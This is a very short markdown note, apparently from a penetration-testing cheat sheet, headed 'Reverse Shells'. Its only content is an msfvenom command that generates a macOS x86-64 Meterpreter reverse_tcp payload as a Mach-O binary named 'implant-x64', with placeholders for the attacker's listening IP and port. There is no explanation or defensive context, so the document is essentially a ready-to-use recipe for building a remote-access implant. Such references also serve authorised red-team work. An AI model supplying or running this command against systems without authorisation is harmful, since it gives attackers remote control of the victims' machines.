# Reverse Shells

1. x86-64 (64-bit) Payloads

```
$ msfvenom -p osx/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f macho -o implant-x64
```